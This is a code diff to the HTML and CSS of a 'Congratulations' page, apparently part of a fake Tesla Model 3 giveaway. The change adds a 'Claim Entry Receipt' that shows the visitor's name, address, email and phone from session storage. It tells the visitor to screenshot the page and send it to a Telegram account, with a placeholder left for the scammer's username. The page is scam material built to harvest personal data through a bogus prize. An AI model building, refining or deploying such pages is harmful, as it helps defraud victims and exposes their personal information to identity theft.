@@ -48,7 +48,7 @@
       background: rgba(15, 23, 42, 0.85);
       border: 1px solid rgba(16, 185, 129, 0.4);
       border-radius: 20px;
-      padding: 36px 24px;
+      padding: 30px 20px;
       text-align: center;
       box-shadow: 
         0 20px 40px rgba(0, 0, 0, 0.6),
@@ -58,33 +58,79 @@
     }
 
     .icon {
-      font-size: 54px;
-      margin-bottom: 15px;
+      font-size: 48px;
+      margin-bottom: 10px;
       filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.5));
     }
 
     h1 {
       font-family: 'Orbitron', sans-serif;
-      font-size: clamp(22px, 6vw, 28px);
+      font-size: clamp(20px, 5.5vw, 26px);
       font-weight: 900;
       color: #10b981;
       text-shadow: 0 0 15px rgba(16, 185, 129, 0.6);
-      margin-bottom: 14px;
+      margin-bottom: 12px;
       letter-spacing: 1.5px;
     }
 
-    .instruction-box {
-      background: rgba(30, 41, 59, 0.6);
-      border: 1px dashed rgba(56, 189, 248, 0.4);
+    /* Submitted Details Display Box */
+    .details-box {
+      background: rgba(30, 41, 59, 0.7);
+      border: 1px solid rgba(168, 85, 247, 0.3);
       border-radius: 12px;
-      padding: 16px;
-      margin: 18px 0 24px;
+      padding: 14px 16px;
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    .details-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 11px;
+      letter-spacing: 1.5px;
+      color: #f472b6;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      padding-bottom: 4px;
+    }
+
+    .detail-row {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 8px;
+    }
+
+    .detail-row:last-child {
+      margin-bottom: 0;
+    }
+
+    .detail-label {
+      font-size: 12px;
+      color: #38bdf8;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .detail-value {
+      font-size: 16px;
+      color: #ffffff;
+      font-weight: 600;
+      word-break: break-word;
+    }
+
+    .instruction-box {
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px dashed rgba(16, 185, 129, 0.4);
+      border-radius: 12px;
+      padding: 12px;
+      margin-bottom: 20px;
     }
 
     .instruction-box p {
-      font-size: 17px;
+      font-size: 15px;
       color: #cbd5e1;
-      line-height: 1.5;
+      line-height: 1.4;
       font-weight: 600;
     }
 
@@ -93,7 +139,6 @@
       font-weight: 700;
     }
 
-    /* Telegram Button */
     .telegram-btn {
       display: flex;
       align-items: center;
@@ -104,7 +149,7 @@
       background: linear-gradient(135deg, #229ed9 0%, #0088cc 100%);
       color: #ffffff;
       font-family: 'Orbitron', sans-serif;
-      font-size: clamp(13px, 3.8vw, 15px);
+      font-size: clamp(12px, 3.5vw, 15px);
       font-weight: 900;
       letter-spacing: 1.5px;
       text-decoration: none;
@@ -123,8 +168,8 @@
     }
 
     .telegram-icon {
-      width: 22px;
-      height: 22px;
+      width: 20px;
+      height: 20px;
       fill: currentColor;
     }
   </style>
@@ -137,12 +182,32 @@
     <div class="icon">🎉</div>
     <h1>CONGRATULATIONS!</h1>
     
-    <div class="instruction-box">
-      <p>Please <span class="highlight">take a screenshot of this page</span> and send it to us on Telegram to verify and claim your Tesla Model 3 reward!</p>
+    <!-- User Information Receipt Box -->
+    <div class="details-box">
+      <div class="details-title">Claim Entry Receipt</div>
+      <div class="detail-row">
+        <span class="detail-label">Name:</span>
+        <span class="detail-value" id="disp_name">---</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Address:</span>
+        <span class="detail-value" id="disp_address">---</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Email:</span>
+        <span class="detail-value" id="disp_email">---</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Phone:</span>
+        <span class="detail-value" id="disp_phone">---</span>
+      </div>
     </div>
 
-    <!-- Telegram Action Link -->
-    <!-- Replace 'YOUR_TELEGRAM_USERNAME' with your actual username or link -->
+    <div class="instruction-box">
+      <p>Take a <span class="highlight">SCREENSHOT</span> of this page and send it via Telegram to verify your entry!</p>
+    </div>
+
+    <!-- Replace YOUR_TELEGRAM_USERNAME with your link -->
     <a href="https://t.me/YOUR_TELEGRAM_USERNAME" target="_blank" class="telegram-btn">
       <svg class="telegram-icon" viewBox="0 0 24 24">
         <path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.56 8.16l-1.97 9.28c-.15.65-.54.81-1.08.5l-3.02-2.23-1.46 1.4c-.16.16-.3.3-.6.3l.21-3.04 5.54-5.01c.24-.22-.05-.34-.37-.13l-6.85 4.31-2.95-.92c-.64-.2-.65-.64.13-.95l11.53-4.44c.53-.2 1 .12.89.93z"/>
@@ -150,6 +215,14 @@
       SEND SCREENSHOT VIA TELEGRAM
     </a>
   </div>
+
+  <script>
+    // Load stored values into the receipt display
+    document.getElementById('disp_name').textContent = sessionStorage.getItem('tesla_name') || 'N/A';
+    document.getElementById('disp_address').textContent = sessionStorage.getItem('tesla_address') || 'N/A';
+    document.getElementById('disp_email').textContent = sessionStorage.getItem('tesla_email') || 'N/A';
+    document.getElementById('disp_phone').textContent = sessionStorage.getItem('tesla_phone') || 'N/A';
+  </script>
 
 </body>
 </html>
